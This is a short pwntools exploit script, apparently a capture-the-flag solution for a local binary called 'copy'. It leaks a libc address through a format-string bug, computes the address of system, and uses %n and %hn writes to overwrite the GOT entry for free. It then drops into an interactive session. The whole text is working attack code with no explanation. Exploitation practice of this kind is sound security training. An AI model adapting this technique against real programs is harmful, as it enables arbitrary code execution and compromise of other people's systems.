from pwn import *
io=process("./copy",env={"LD_PRELOAD":"./libc.so.6"})
gdb.attach(io)
io.sendlineafter("sort?\n","100")
atoi=0x804a038
io.sendline("0"*7+"134513904"+p32(105)+p32(0)+"bbbb"+p32(atoi)+"a"*48)
io.sendline("%27$p")
io.recvuntil("2th number:")
leak=io.recv(10)
leak=int(leak,16)
base=leak-0x18600
system=base+0x3ac62
print hex(system)
first=system&0xffff
last=(system&0xffff0000)>>16
print hex(first)
print hex(last)
free=0x804a018
payload=p32(free)+"%"+str(first-4)+"c"+"%7$n"
io.sendlineafter("3th number:",payload)
payload=p32(free+2)+"%"+str(last-4)+"c"+"%7$hn"
io.sendlineafter("4th number:",payload)
io.interactive()
